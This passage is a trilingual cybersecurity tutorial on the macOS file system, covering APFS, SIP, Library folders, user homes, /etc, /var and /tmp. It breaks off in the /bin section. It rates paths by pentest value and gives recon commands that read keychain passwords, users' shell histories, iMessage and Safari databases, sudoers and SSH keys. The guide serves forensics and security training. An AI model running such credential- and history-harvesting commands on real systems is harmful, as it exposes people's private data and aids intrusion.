# 🍎 macOS File System

> **LearnCybersecurity** | macOS Fundamentals Series  
> 📅 Last Updated: 2026 | 👤 Author: kodoktheGr3at

---

## 📖 Daftar Isi / Table of Contents / 目次

| # | Topic | Bahasa Indonesia | English | 日本語 |
|---|-------|-----------------|---------|--------|
| 1 | Overview | Apa itu macOS File System | What is the macOS File System | macOSファイルシステムとは |
| 2 | File Tree | Pohon direktori lengkap | Full directory tree | 完全なディレクトリツリー |
| 3 | Root `/` | Direktori akar | Root directory | ルートディレクトリ |
| 4 | `/Applications` | Aplikasi terinstal | Installed applications | インストール済みアプリ |
| 5 | `/System` | Inti sistem operasi (SIP) | Core OS (SIP-protected) | コアOS（SIP保護） |
| 6 | `/Library` & `~/Library` | Data aplikasi & sistem | App & system support data | アプリ・システムデータ |
| 7 | `/Users` | Direktori pengguna | User home directories | ユーザーホームディレクトリ |
| 8 | `/private/etc` | Konfigurasi Unix-style | Unix-style configuration | Unix形式の設定 |
| 9 | `/private/var` | Data variabel & log | Variable data & logs | 可変データとログ |
| 10 | `/private/tmp` | File sementara | Temporary files | 一時ファイル |
| 11 | `/bin` & `/sbin` | Binary Unix esensial | Essential Unix binaries | 必須Unixバイナリ |
| 12 | `/usr` | Resource Unix bersama | Unix shared resources | Unix共有リソース |
| 13 | `.app` Bundles | Struktur paket aplikasi | Application bundle structure | アプリバンドル構造 |
| 14 | SIP & Gatekeeper | Proteksi sistem macOS | macOS system protections | macOSシステム保護機能 |
| 15 | Keychain | Penyimpanan kredensial | Credential storage | 認証情報ストレージ |
| 16 | LaunchAgents/Daemons | Persistence & startup | Persistence & startup | 永続化と起動 |
| 17 | Volumes & APFS | Struktur volume modern | Modern volume structure | 現代のボリューム構造 |
| 18 | Security Note | Direktori penting untuk pentest | Key dirs for pentesting | ペンテスト重要ディレクトリ |
| 19 | Workflow | Navigasi & rekon praktis | Practical recon navigation | 実践的な偵察ナビゲーション |

---

## 1. 🏢 Overview — What Is the macOS File System

### 🇮🇩 Bahasa Indonesia
**macOS File System** dibangun di atas fondasi **Unix (BSD/Darwin)**, sehingga strukturnya mirip dengan Linux — satu pohon direktori tunggal dari `/`. Namun, macOS menambahkan lapisan khusus Apple seperti `/Applications`, `/Library`, dan format `.app` bundle yang tidak ada di Linux murni.

Filesystem modern yang digunakan adalah **APFS (Apple File System)**, menggantikan HFS+ lama. APFS mendukung:
- **Snapshot** — pemulihan state filesystem instan
- **Volume groups** — banyak volume berbagi 1 partisi fisik (Data + System terpisah sejak macOS Catalina)
- **Native encryption** — FileVault terintegrasi penuh
- **Copy-on-write & space sharing**

Sejak macOS Catalina (10.15), sistem menerapkan **Read-Only System Volume** — volume `/System` dipisah dari volume `Data`, dan dilindungi oleh **SIP (System Integrity Protection)**.

**Mengapa penting untuk cybersecurity:**
- Mengetahui **lokasi credential** (Keychain, browser data) → target rekognisi
- Memahami **SIP & sandboxing** → batasan privilege escalation
- Mengenal **lokasi log unified** → forensik dan incident response
- Memahami **LaunchAgents/LaunchDaemons** → persistence & malware analysis
- Mengetahui **struktur .app bundle** → analisis malware macOS

### 🇬🇧 English
The **macOS File System** is built on a **Unix (BSD/Darwin)** foundation, so its structure resembles Linux — one single directory tree from `/`. However, macOS adds Apple-specific layers like `/Applications`, `/Library`, and the `.app` bundle format not found in plain Linux.

The modern filesystem used is **APFS (Apple File System)**, replacing the older HFS+. APFS supports:
- **Snapshots** — instant filesystem state recovery
- **Volume groups** — multiple volumes sharing one physical partition (Data + System split since macOS Catalina)
- **Native encryption** — fully integrated FileVault
- **Copy-on-write & space sharing**

Since macOS Catalina (10.15), the system enforces a **Read-Only System Volume** — the `/System` volume is split from the `Data` volume, and protected by **SIP (System Integrity Protection)**.

**Why it matters for cybersecurity:**
- Knowing **credential locations** (Keychain, browser data) → reconnaissance target
- Understanding **SIP & sandboxing** → privilege escalation boundaries
- Knowing **unified log locations** → forensics and incident response
- Understanding **LaunchAgents/LaunchDaemons** → persistence & malware analysis
- Knowing **.app bundle structure** → macOS malware analysis

### 🇯🇵 日本語
**macOSファイルシステム**は**Unix（BSD/Darwin）**を基盤として構築されているため、その構造はLinuxに似ています — `/`から始まる単一のディレクトリツリーです。ただし、macOSは`/Applications`、`/Library`、純粋なLinuxには存在しない`.app`バンドル形式などのApple固有のレイヤーを追加しています。

使用されている現代のファイルシステムは**APFS（Apple File System）**で、古いHFS+を置き換えています。APFSは以下をサポートします：
- **スナップショット** — 瞬時のファイルシステム状態復元
- **ボリュームグループ** — 複数のボリュームが1つの物理パーティションを共有（macOS Catalina以降、DataとSystemが分離）
- **ネイティブ暗号化** — 完全統合されたFileVault
- **コピーオンライトとスペース共有**

macOS Catalina（10.15）以降、システムは**読み取り専用システムボリューム**を強制します — `/System`ボリュームは`Data`ボリュームから分離され、**SIP（システム整合性保護）**によって保護されています。

**サイバーセキュリティにとって重要な理由：**
- **認証情報の場所**（Keychain、ブラウザデータ）を知る → 偵察ターゲット
- **SIPとサンドボックス**を理解する → 権限昇格の境界
- **統合ログの場所**を知る → フォレンジクスとインシデントレスポンス
- **LaunchAgents/LaunchDaemons**を理解する → 永続化とマルウェア分析
- **.appバンドル構造**を知る → macOSマルウェア分析

---

## 2. 🌳 File Tree — Full Directory Structure

```
/                                      ← Root of the entire file system (Data volume, writable)
│
├── Applications/                      ← User-installed & built-in apps (.app bundles)
│   ├── Safari.app/
│   ├── Utilities/                     ← Built-in utility apps
│   │   ├── Terminal.app/
│   │   ├── Activity Monitor.app/
│   │   ├── Console.app/
│   │   ├── Keychain Access.app/
│   │   └── Disk Utility.app/
│   └── ThirdPartyApp.app/
│
├── System/                            ← Read-only, SIP-protected (sealed system volume)
│   ├── Applications/                  ← Apple's built-in apps (Catalina+)
│   ├── Library/                       ← System-level frameworks, daemons, extensions
│   │   ├── LaunchDaemons/             ← System-wide background services (persistence!)
│   │   ├── LaunchAgents/              ← System-wide per-user agents
│   │   ├── Extensions/                ← Kernel extensions (kext) — legacy
│   │   ├── Frameworks/                ← System frameworks
│   │   ├── CoreServices/              ← Finder, SystemUIServer, etc.
│   │   ├── PrivateFrameworks/
│   │   └── Keychains/                 ← System root certificates
│   └── Volumes/
│       └── Data/                      ← Symlinked to writable data volume (Catalina+)
│
├── Library/                           ← System-wide application support (not user-specific)
│   ├── Application Support/
│   ├── LaunchAgents/                  ← Third-party agents (login items, persistence!)
│   ├── LaunchDaemons/                 ← Third-party daemons (persistence!)
│   ├── Logs/                          ← System & app logs
│   │   ├── DiagnosticReports/         ← Crash reports (forensics!)
│   │   └── CrashReporter/
│   ├── Preferences/                   ← System-wide plist preference files
│   ├── Caches/
│   ├── Extensions/                    ← Legacy kernel extensions
│   ├── StartupItems/                  ← Legacy startup items (pre-launchd)
│   ├── Keychains/                     ← System keychain
│   ├── WebServer/                     ← Legacy Apache web root (older macOS)
│   └── Printers/
│
├── Users/                             ← All user home directories
│   ├── Shared/                        ← Shared between all users
│   │
│   ├── alice/                         ← Regular user's home directory
│   │   ├── Desktop/
│   │   ├── Documents/
│   │   ├── Downloads/
│   │   ├── Movies/
│   │   ├── Music/
│   │   ├── Pictures/
│   │   ├── Public/                    ← Drop Box for file sharing
│   │   ├── .bash_history              ← Command history! (hidden)
│   │   ├── .zsh_history               ← Zsh history (default shell since Catalina)
│   │   ├── .ssh/                      ← SSH keys (hidden)
│   │   │   ├── id_rsa                 ← Private key
│   │   │   ├── id_ed25519
│   │   │   └── known_hosts
│   │   └── Library/                   ← PER-USER app data (hidden by default!)
│   │       ├── Application Support/   ← App data, configs, sometimes credentials
│   │       │   ├── Slack/
│   │       │   ├── 1Password/
│   │       │   └── Google/Chrome/
│   │       ├── Preferences/           ← .plist files — app & system settings
│   │       │   └── com.apple.finder.plist
│   │       ├── Caches/                ← App caches
│   │       ├── Cookies/               ← Browser cookies (legacy location)
│   │       ├── Keychains/             ← User's login.keychain-db!
│   │       │   └── login.keychain-db  ← Saved passwords, certs, keys!
│   │       ├── LaunchAgents/          ← Per-user persistence!
│   │       ├── Mail/                  ← Local Mail.app data
│   │       ├── Messages/              ← iMessage database (chat.db)
│   │       ├── Safari/                ← Safari history, bookmarks
│   │       │   └── History.db
│   │       ├── Logs/                  ← Per-app logs
│   │       ├── CloudStorage/          ← iCloud Drive, Dropbox, etc.
│   │       └── Containers/            ← Sandboxed app data (per bundle ID)
│   │
│   └── bob/
│       └── (same structure as above)
│
├── private/                           ← Actual location of /etc, /tmp, /var (symlinked from root)
│   ├── etc/                           ← Unix-style system config (symlink target of /etc)
│   │   ├── passwd                     ← Legacy user list (NOT primary source — see dscl)
│   │   ├── hosts                      ← Static hostname resolution
│   │   ├── ssh/
│   │   │   └── sshd_config
│   │   ├── sudoers                    ← Sudo permissions
│   │   ├── pf.conf                    ← Packet filter firewall config
│   │   └── crontab                    ← Legacy cron (launchd preferred now)
│   ├── var/                           ← Variable data (symlink target of /var)
│   │   ├── log/
│   │   │   ├── system.log             ← Legacy system log (pre-unified logging)
│   │   │   ├── install.log            ← Installation events
│   │   │   ├── wifi.log
│   │   │   └── DiagnosticMessages/
│   │   ├── db/
│   │   │   └── dslocal/               ← Local user account database (Open Directory)
│   │   │       └── nodes/Default/users/
│   │   ├── folders/                   ← Per-user temp & cache (randomized paths!)
│   │   ├── root/                      ← root user's home (rarely used directly)
│   │   └── audit/                     ← BSM security audit logs
│   └── tmp/                           ← Temporary files (symlink target of /tmp)
│
├── bin/                                ← Essential Unix binaries (bash, ls, cp, cat...)
├── sbin/                               ← Essential system admin binaries
│
├── usr/                                 ← Unix shared resources
│   ├── bin/                             ← Most command-line tools
│   ├── sbin/
│   ├── lib/
│   ├── local/                           ← Homebrew (Intel) typically lives here
│   │   └── bin/
│   └── share/
│
├── opt/                                  ← Homebrew (Apple Silicon) typically lives here
│   └── homebrew/
│       └── bin/
│
├── etc -> private/etc                    ← Symlink
├── tmp -> private/tmp                    ← Symlink
├── var -> private/var                    ← Symlink
│
├── Volumes/                              ← Mounted external/network volumes
│   ├── Macintosh HD/                     ← Self-reference to boot volume
│   └── USB_DRIVE/
│
├── .Spotlight-V100/                      ← Spotlight search index (hidden)
├── .fseventsd/                           ← Filesystem event logs (forensics!)
├── .Trashes/                             ← Trash for non-boot volumes
├── .DS_Store                             ← Per-folder Finder metadata (forensics!)
│
└── cores/                                ← Core dump files (crash forensics)
```

---

## 3. 🌐 `/` — Root Directory (Synthetic Firmlink View)

### 🇮🇩 Bahasa Indonesia
Sejak macOS Catalina, `/` yang kamu lihat sebenarnya adalah **gabungan tampilan (firmlink)** dari dua volume terpisah: **System volume** (read-only, disegel kriptografis) dan **Data volume** (writable). Apple menggunakan **firmlinks** (bukan symlink biasa) untuk membuat keduanya tampak sebagai satu pohon direktori, transparan bagi pengguna.

### 🇬🇧 English
Since macOS Catalina, the `/` you see is actually a **merged view (firmlink)** of two separate volumes: the **System volume** (read-only, cryptographically sealed) and the **Data volume** (writable). Apple uses **firmlinks** (not regular symlinks) to make both appear as a single directory tree, transparent to the user.

### 🇯🇵 日本語
macOS Catalina以降、目にする`/`は実際には2つの別々のボリューム — **システムボリューム**（読み取り専用、暗号学的に封印）と**データボリューム**（書き込み可能） — の**統合ビュー（ファームリンク）**です。Appleは**ファームリンク**（通常のシンボリックリンクではない）を使って、両方をユーザーに対して透過的な単一のディレクトリツリーとして見せています。

```bash
# Navigate to root
$ cd /
$ ls -la /

# Check the volume structure
$ diskutil list
/dev/disk3 (synthesized):
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:      APFS Container Scheme -                       +494.4 GB  disk3
                                 Physical Store disk0s2
   1:                APFS Volume Macintosh HD - Data      300.1 GB   disk3s1
   2:                APFS Volume Macintosh HD             15.3 GB    disk3s5  (System, sealed)
   3:                APFS Volume Preboot                  500.0 MB   disk3s2
   4:                APFS Volume Recovery                 1.1 GB     disk3s3
   5:                APFS Volume VM                       1.1 GB     disk3s6

# View firmlinks mapping
$ cat /usr/share/firmlinks
/AppleInternal	AppleInternal
/Applications	Applications
/Library	Library
/System/Library/Caches	System/Library/Caches
/Users	Users
/Volumes	Volumes
...

# Check if SIP is enabled
$ csrutil status
System Integrity Protection status: enabled.
```

---

## 4. 📱 `/Applications` — Installed Applications

### 🇮🇩 Bahasa Indonesia
`/Applications` adalah lokasi standar untuk **aplikasi yang terinstal** di macOS, baik bawaan Apple maupun pihak ketiga. Setiap aplikasi adalah **bundle `.app`** — sebenarnya folder yang berisi executable, resource, dan metadata, tapi ditampilkan Finder sebagai satu file.

### 🇬🇧 English
`/Applications` is the standard location for **installed applications** on macOS, both Apple's own and third-party. Each application is a **`.app` bundle** — actually a folder containing the executable, resources, and metadata, but displayed by Finder as a single file.

### 🇯🇵 日本語
`/Applications` はmacOSにおける**インストール済みアプリケーション**（Apple純正とサードパーティの両方）の標準的な場所です。各アプリケーションは**`.app`バンドル** — 実際は実行ファイル、リソース、メタデータを含むフォルダですが、Finderでは単一のファイルとして表示されます。

```bash
# List installed applications
$ ls /Applications

# List applications with details
$ ls -la /Applications/*.app

# Find all .app bundles system-wide
$ find / -name "*.app" -maxdepth 4 2>/dev/null

# Check app's bundle identifier
$ defaults read /Applications/Safari.app/Contents/Info.plist CFBundleIdentifier
com.apple.Safari

# Check code signature (important for security analysis)
$ codesign -dv --verbose=4 /Applications/Safari.app

# List running applications
$ osascript -e 'tell application "System Events" to get name of every process'

# System-wide installed application inventory (via system_profiler)
$ system_profiler SPApplicationsDataType
```

| Path | 🇮🇩 Isi | 🇬🇧 Contents | 🇯🇵 内容 | Pentest Value |
|------|--------|-------------|---------|--------------|
| `/Applications/*.app` | Aplikasi level-user | User-level applications | ユーザーレベルアプリ | 🟡 Medium |
| `/System/Applications/*.app` | Aplikasi bawaan Apple | Apple built-in apps | Apple純正アプリ | 🟢 Low |
| `*.app/Contents/MacOS/` | Binary executable | Executable binary | 実行ファイル | 🔴 High |
| `*.app/Contents/Info.plist` | Metadata aplikasi | App metadata | アプリメタデータ | 🟡 Medium |
| `*.app/Contents/Resources/` | Asset & resource | Assets & resources | アセットとリソース | 🟢 Low |

---

## 5. 🔒 `/System` — Core OS (SIP-Protected)

### 🇮🇩 Bahasa Indonesia
`/System` adalah **jantung sistem operasi macOS**, berisi semua framework, daemon, dan komponen inti Apple. Sejak macOS Big Sur, volume ini bersifat **read-only dan disegel secara kriptografis** — bahkan root tidak bisa menulis ke sini tanpa menonaktifkan SIP terlebih dahulu.

> ⚠️ `/System/Library` berbeda dari `/Library` (level-sistem tapi tidak SIP-protected) dan `~/Library` (per-user). Jangan tertukar!

### 🇬🇧 English
`/System` is the **heart of the macOS operating system**, containing all of Apple's core frameworks, daemons, and components. Since macOS Big Sur, this volume is **read-only and cryptographically sealed** — even root cannot write here without disabling SIP first.

> ⚠️ `/System/Library` is different from `/Library` (system-level but not SIP-protected) and `~/Library` (per-user). Don't confuse them!

### 🇯🇵 日本語
`/System` はmacOSオペレーティングシステムの**中核**であり、すべてのApple純正フレームワーク、デーモン、コンポーネントが含まれています。macOS Big Sur以降、このボリュームは**読み取り専用で暗号学的に封印**されています — rootであってもSIPを無効化しない限り、ここに書き込むことはできません。

> ⚠️ `/System/Library`は`/Library`（システムレベルだがSIP保護されていない）と`~/Library`（ユーザーごと）とは異なります。混同しないでください！

```bash
# Attempt to write to /System (will fail with SIP enabled)
$ sudo touch /System/test.txt
touch: /System/test.txt: Read-only file system

# View SIP-protected paths
$ csrutil status
System Integrity Protection status: enabled.

# List system LaunchDaemons (persistence-relevant, but SIP-protected)
$ ls /System/Library/LaunchDaemons/ | head -10

# View kernel extensions (legacy, mostly replaced by System Extensions)
$ ls /System/Library/Extensions/ | head -10
$ kextstat                       # list loaded kernel extensions (deprecated cmd)
$ kmutil showloaded              # modern equivalent

# Check System Extensions (modern replacement for kexts)
$ systemextensionsctl list

# View CoreServices (Finder, Dock, etc.)
$ ls /System/Library/CoreServices/
```

| Subdirectory | 🇮🇩 Isi | 🇬🇧 Contents | 🇯🇵 内容 |
|--------------|--------|-------------|---------|
| `/System/Library/LaunchDaemons` | Service sistem Apple | Apple system services | Appleシステムサービス |
| `/System/Library/Frameworks` | Framework inti macOS | Core macOS frameworks | macOSコアフレームワーク |
| `/System/Library/CoreServices` | Finder, SystemUIServer | Finder, SystemUIServer | Finder、SystemUIServer |
| `/System/Library/Extensions` | Kernel extensions (legacy) | Kernel extensions (legacy) | カーネル拡張（レガシー） |
| `/System/Library/Keychains` | Root certificate sistem | System root certificates | システムルート証明書 |

---

## 6. 📚 `/Library` & `~/Library` — Application Support Data

### 🇮🇩 Bahasa Indonesia
Ada **dua lokasi Library** dengan tujuan berbeda:
- **`/Library`** — data dan preferensi level-**sistem** (berlaku untuk semua user), **tidak** dilindungi SIP, jadi root bisa menulis di sini
- **`~/Library`** — data dan preferensi level-**user**, tersembunyi dari Finder secara default sejak macOS 10.7

`~/Library` adalah **harta karun forensik** — berisi keychain, cache browser, database pesan, dan preferensi aplikasi setiap user.

### 🇬🇧 English
There are **two Library locations** with different purposes:
- **`/Library`** — **system**-level data and preferences (applies to all users), **not** SIP-protected, so root can write here
- **`~/Library`** — **user**-level data and preferences, hidden from Finder by default since macOS 10.7

`~/Library` is a **forensic goldmine** — containing keychains, browser caches, messaging databases, and per-user application preferences.

### 🇯🇵 日本語
目的が異なる**2つのLibrary**の場所があります：
- **`/Library`** — **システム**レベルのデータと設定（全ユーザーに適用）、SIPで保護されて**いない**ため、rootはここに書き込み可能
- **`~/Library`** — **ユーザー**レベルのデータと設定、macOS 10.7以降デフォルトでFinderから隠されている

`~/Library`は**フォレンジクスの宝庫**です — キーチェーン、ブラウザキャッシュ、メッセージデータベース、ユーザーごとのアプリ設定が含まれています。

```bash
# Show hidden ~/Library in Finder (one-time)
$ chflags nohidden ~/Library

# Or navigate directly via Terminal (always accessible)
$ cd ~/Library
$ ls -la

# ── HIGH-VALUE FORENSIC LOCATIONS ────────────────────────────────

# Preferences (plist files — app & system settings)
$ ls ~/Library/Preferences/
$ defaults read com.apple.finder

# Saved passwords & certificates (requires unlock / Touch ID)
$ ls ~/Library/Keychains/
$ security list-keychains
$ security find-generic-password -ga "AccountName"   # prompts for keychain password

# Browser data (Safari)
$ sqlite3 ~/Library/Safari/History.db "SELECT url FROM history_items LIMIT 10;"

# Chrome data
$ ls ~/Library/Application\ Support/Google/Chrome/Default/

# iMessage database (forensics gold)
$ sqlite3 ~/Library/Messages/chat.db "SELECT text FROM message LIMIT 10;"

# Application crash logs
$ ls ~/Library/Logs/DiagnosticReports/

# LaunchAgents — persistence!
$ ls ~/Library/LaunchAgents/

# Login items (apps that start at login)
$ osascript -e 'tell application "System Events" to get the name of every login item'

# Quarantine database (downloaded file history — Gatekeeper)
$ sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \
    "SELECT LSQuarantineDataURLString FROM LSQuarantineEvent LIMIT 10;"
```

### 🔑 High-Value Files in `~/Library/`

| Path | 🇮🇩 Isi | 🇬🇧 Contents | 🇯🇵 内容 | Pentest Value |
|------|--------|-------------|---------|--------------|
| `Keychains/login.keychain-db` | Password & cert tersimpan | Saved passwords & certs | 保存されたパスワードと証明書 | 🔴 Critical |
| `Application Support/` | Data & config aplikasi | App data & config | アプリデータと設定 | 🔴 High |
| `Safari/History.db` | Riwayat browsing | Browsing history | 閲覧履歴 | 🟠 High |
| `Messages/chat.db` | Database iMessage | iMessage database | iMessageデータベース | 🔴 High |
| `Preferences/*.plist` | Pengaturan aplikasi/sistem | App/system settings | アプリ/システム設定 | 🟡 Medium |
| `LaunchAgents/` | Persistence per-user | Per-user persistence | ユーザーごとの永続化 | 🔴 High |
| `Logs/DiagnosticReports/` | Crash report | Crash reports | クラッシュレポート | 🟡 Medium |
| `Containers/` | Data app sandboxed | Sandboxed app data | サンドボックス化アプリデータ | 🟠 High |
| `CloudStorage/` | iCloud Drive, Dropbox, dll | iCloud Drive, Dropbox, etc. | iCloud Drive、Dropboxなど | 🟡 Medium |

---

## 7. 👥 `/Users` — User Home Directories

### 🇮🇩 Bahasa Indonesia
`/Users` berisi **direktori home untuk setiap user** di sistem, setara dengan `/home` di Linux. macOS menggunakan **Zsh sebagai shell default** sejak Catalina (sebelumnya Bash). Setiap user memiliki folder standar (Desktop, Documents, dll.) plus `~/Library` tersembunyi.

### 🇬🇧 English
`/Users` contains the **home directory for each user** on the system, equivalent to `/home` on Linux. macOS uses **Zsh as the default shell** since Catalina (previously Bash). Each user has standard folders (Desktop, Documents, etc.) plus a hidden `~/Library`.

### 🇯🇵 日本語
`/Users` にはシステム上の**各ユーザーのホームディレクトリ**が含まれており、Linuxの`/home`に相当します。macOSはCatalina以降**デフォルトシェルとしてZsh**を使用しています（以前はBash）。各ユーザーは標準フォルダ（Desktop、Documentsなど）に加え、隠された`~/Library`を持ちます。

```bash
# List all user home directories
$ ls /Users
$ dscl . list /Users                     # list all user accounts (incl. system accounts)
$ dscl . list /Users | grep -v "^_"       # filter out system/service accounts

# Navigate to a user's home
$ cd /Users/alice
$ ls -la

# Shell history (gold mine!)
$ cat ~/.zsh_history                      # Zsh (default since Catalina)
$ cat ~/.bash_history                     # Bash (if used)

# Recently opened files / Quick Look cache
$ sqlite3 ~/Library/Application\ Support/com.apple.sharedfilelist/*.sfl2

# SSH keys
$ ls -la ~/.ssh/
$ cat ~/.ssh/id_rsa.pub

# Get info about all local user accounts
$ dscl . -list /Users UniqueID
$ dscl . -read /Users/alice

# Check admin group membership
$ dscl . -read /Groups/admin GroupMembership

# Foreach user, check shell history
$ for user in $(ls /Users); do
    echo "=== $user ==="
    sudo cat "/Users/$user/.zsh_history" 2>/dev/null
done
```

### 🔑 High-Value Files in `/Users/<username>/`

| Path | 🇮🇩 Isi | 🇬🇧 Contents | 🇯🇵 内容 | Pentest Value |
|------|--------|-------------|---------|--------------|
| `.zsh_history` | Riwayat perintah Zsh | Zsh command history | Zshコマンド履歴 | 🔴 Critical |
| `.bash_history` | Riwayat perintah Bash | Bash command history | Bashコマンド履歴 | 🔴 Critical |
| `.ssh/id_rsa` / `id_ed25519` | SSH private key | SSH private key | SSH秘密鍵 | 🔴 High |
| `Library/Keychains/` | Kredensial tersimpan | Stored credentials | 保存された認証情報 | 🔴 Critical |
| `Desktop/` & `Documents/` | File pengguna | User files | ユーザーファイル | 🟡 Medium |
| `Public/` | Folder berbagi (Drop Box) | Shared folder (Drop Box) | 共有フォルダ | 🟡 Medium |

---

## 8. ⚙️ `/private/etc` — Unix-Style Configuration

### 🇮🇩 Bahasa Indonesia
`/etc` di macOS sebenarnya adalah **symlink ke `/private/etc`**. Berisi file konfigurasi Unix-style klasik. Namun, penting dicatat: macOS **tidak** menggunakan `/etc/passwd` sebagai sumber utama daftar user — itu digantikan oleh **Open Directory / dscl** (Directory Service), meskipun `/etc/passwd` masih ada untuk kompatibilitas.

### 🇬🇧 English
`/etc` on macOS is actually a **symlink to `/private/etc`**. It contains classic Unix-style configuration files. Importantly: macOS does **not** use `/etc/passwd` as the primary source for the user list — that's replaced by **Open Directory / dscl** (Directory Service), though `/etc/passwd` still exists for compatibility.

### 🇯🇵 日本語
macOSの`/etc`は実際には**`/private/etc`へのシンボリックリンク**です。クラシックなUnix形式の設定ファイルが含まれています。重要な点として：macOSはユーザーリストの主要なソースとして`/etc/passwd`を**使用しません** — それは**Open Directory / dscl**（ディレクトリサービス）に置き換えられていますが、互換性のために`/etc/passwd`は今も存在します。

```bash
# Confirm /etc is a symlink
$ ls -la / | grep etc
lrwxr-xr-x  1 root  wheel  11 etc -> private/etc

# Static hostname resolution
$ cat /etc/hosts

# SSH daemon configuration
$ cat /etc/ssh/sshd_config

# Sudoers
$ sudo cat /etc/sudoers

# Packet filter firewall config
$ cat /etc/pf.conf
$ sudo pfctl -s rules              # show active firewall rules

# PRIMARY user database is Open Directory, NOT /etc/passwd:
$ dscl . list /Users
$ dscl . read /Users/alice UniqueID
$ dscl . read /Users/alice UserShell

# /etc/passwd is mostly a compatibility stub on modern macOS
$ cat /etc/passwd
##
# User Database
# Note that this file is consulted directly only when the system is running
# in single-user mode...
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
```

| File | 🇮🇩 Isi | 🇬🇧 Contents | 🇯🇵 内容 | Pentest Value |
|------|--------|-------------|---------|--------------|
| `/etc/hosts` | Resolusi hostname statis | Static hostname resolution | 静的ホスト名解決 | 🟡 Medium |
| `/etc/ssh/sshd_config` | Konfigurasi SSH daemon | SSH daemon config | SSHデーモン設定 | 🔴 High |
| `/etc/sudoers` | Izin sudo | Sudo permissions | sudo権限 | 🔴 Critical |
| `/etc/pf.conf` | Konfigurasi firewall | Firewall configuration | ファイアウォール設定 | 🟠 High |
| `/etc/passwd` | Stub kompatibilitas (bukan sumber utama) | Compatibility stub (not primary source) | 互換性スタブ（主要ソースではない） | 🟢 Low |

---

## 9. 📊 `/private/var` — Variable Data & Logs

### 🇮🇩 Bahasa Indonesia
`/var` (symlink ke `/private/var`) berisi data yang sering berubah. Sejak macOS Sierra, sebagian besar logging beralih ke **Unified Logging System** (diakses via `log` command), bukan lagi file teks flat seperti `syslog` klasik. Tapi beberapa log legacy masih ada di sini.

### 🇬🇧 English
`/var` (symlinked to `/private/var`) contains frequently changing data. Since macOS Sierra, most logging moved to the **Unified Logging System** (accessed via the `log` command), rather than flat text files like the classic `syslog`. But some legacy logs still exist here.

### 🇯🇵 日本語
`/var`（`/private/var`へのシンボリックリンク）には頻繁に変化するデータが含まれています。macOS Sierra以降、ほとんどのロギングはクラシックな`syslog`のようなフラットなテキストファイルではなく、**統合ロギングシステム**（`log`コマンド経由でアクセス）に移行しました。ただし、一部のレガシーログはここに残っています。

```bash
# ── UNIFIED LOGGING SYSTEM (modern, primary method) ───────────────
$ log show --last 1h                            # show logs from last hour
$ log show --predicate 'eventMessage contains "ssh"' --last 1h
$ log stream                                      # live stream of system logs
$ log stream --predicate 'process == "sshd"'      # filter by process
$ log show --predicate 'subsystem == "com.apple.securityd"' --last 1d

# Authentication-related logs
$ log show --predicate 'eventMessage contains "authentication"' --last 1h

# ── LEGACY LOG FILES (still present) ───────────────────────────────
$ cat /var/log/system.log              # legacy system log (pre-Sierra style)
$ cat /var/log/install.log             # installation events
$ cat /var/log/wifi.log                # Wi-Fi connection events

# ── LOCAL USER DATABASE (Open Directory backend) ───────────────────
$ ls /var/db/dslocal/nodes/Default/users/
$ sudo plutil -p /var/db/dslocal/nodes/Default/users/alice.plist

# ── PER-USER TEMP/CACHE (randomized path!) ──────────────────────────
$ echo $TMPDIR
/var/folders/zz/zyxvpxvq6csfxvn_n0000000000/T/

# ── SECURITY AUDIT LOGS (BSM format) ────────────────────────────────
$ sudo praudit -l /var/audit/[timestamp]
```

### 📁 Key Subdirectories in `/var`

| Directory | 🇮🇩 Isi | 🇬🇧 Contents | 🇯🇵 内容 |
|-----------|--------|-------------|---------|
| `/var/log` | Log legacy & instalasi | Legacy & install logs | レガシーとインストールログ |
| `/var/db/dslocal` | Database user lokal | Local user database | ローカルユーザーDB |
| `/var/folders` | Temp/cache per-user (acak) | Per-user temp/cache (randomized) | ユーザーごとの一時/キャッシュ |
| `/var/audit` | Log audit keamanan (BSM) | Security audit logs (BSM) | セキュリティ監査ログ |
| `/var/root` | Home root (jarang dipakai) | Root's home (rarely used) | rootのホーム（あまり使われない） |

---

## 10. 🗑️ `/private/tmp` — Temporary Files

### 🇮🇩 Bahasa Indonesia
`/tmp` (symlink ke `/private/tmp`) adalah lokasi temp world-writable klasik, tapi macOS lebih sering menggunakan `$TMPDIR` **per-user yang dirandomisasi** (di `/var/folders/...`) untuk aplikasi modern. Kedua lokasi penting untuk diperiksa saat post-exploitation.

### 🇬🇧 English
`/tmp` (symlinked to `/private/tmp`) is the classic world-writable temp location, but macOS more often uses a **randomized per-user `$TMPDIR`** (under `/var/folders/...`) for modern applications. Both locations are important to check during post-exploitation.

### 🇯🇵 日本語
`/tmp`（`/private/tmp`へのシンボリックリンク）はクラシックな全ユーザー書き込み可能な一時的な場所ですが、macOSは現代のアプリケーションでは**ランダム化されたユーザーごとの`$TMPDIR`**（`/var/folders/...`配下）をより頻繁に使います。ポストエクスプロイテーション中はどちらの場所も確認することが重要です。

```bash
# Classic /tmp
$ ls -la /tmp/
drwxrwxrwt  root wheel  tmp     ← "t" = sticky bit

# Modern randomized per-user temp directory
$ echo $TMPDIR
/var/folders/zz/zyxvpxvq6csfxvn_n0000000000/T/
$ ls -la "$TMPDIR"

# Find ALL per-user temp dirs (useful in multi-user forensics)
$ ls -la /var/folders/

# Common attacker artifacts to check:
$ ls -la /tmp/ "$TMPDIR" 2>/dev/null
# - Dropped payloads, downloaded scripts
# - Compiled exploit binaries
# - Persistence staging plists before being moved to LaunchAgents
```

> ⚠️ **Pentesting note:** Karena `$TMPDIR` per-user acak dan berubah tiap sesi, banyak tool keamanan dan analis luput memeriksanya. Selalu cek `echo $TMPDIR` saat berada di sesi shell sebuah user.

---

## 11. 📦 `/bin` & `/sbin` — Essential Unix Binaries

### 🇮🇩 Bahasa Indonesia
Sama seperti Linux, `/bin` dan `/sbin` berisi binary Unix paling esensial. Namun mulai macOS Catalina+, lokasi ini berada di **read-only System volume**, dan beberapa tool BSD klasik (seperti `netstat`, `ifconfig`) makin sering digantikan oleh tool modern Apple (`lsof -i`, `networksetup`, `scutil`).

### 🇬🇧 English
Just like Linux, `/bin` and `/sbin` contain the most essential Unix binaries. However, since macOS Catalina+, this location resides on the **read-only System volume**, and several classic BSD tools (like `netstat`, `ifconfig`) are increasingly superseded by modern Apple tools (`lsof -i`, `networksetup`, `scutil`).

### 🇯🇵 日本語
